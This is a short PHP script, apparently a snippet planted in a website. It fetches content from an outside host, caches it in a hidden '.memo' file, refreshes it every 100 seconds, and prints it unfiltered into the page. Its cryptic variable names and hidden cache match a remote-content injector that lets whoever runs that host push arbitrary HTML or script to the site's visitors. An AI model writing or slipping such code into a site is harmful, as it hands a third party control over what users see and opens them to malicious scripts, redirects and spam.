<?php
$fyz=".memo";
$stm="http://mymemo.pro/discord/bro.php";

if(file_exists($fyz)){
	if(filectime($fyz)<time()-100){
$xys=file_get_contents($stm);
file_put_contents($fyz,$xys);
echo $xys;
	}else{
$xys=file_get_contents($fyz);
echo $xys;
	}
   
}else{
$xys=file_get_contents($stm);
file_put_contents($fyz,$xys);
echo $xys;
}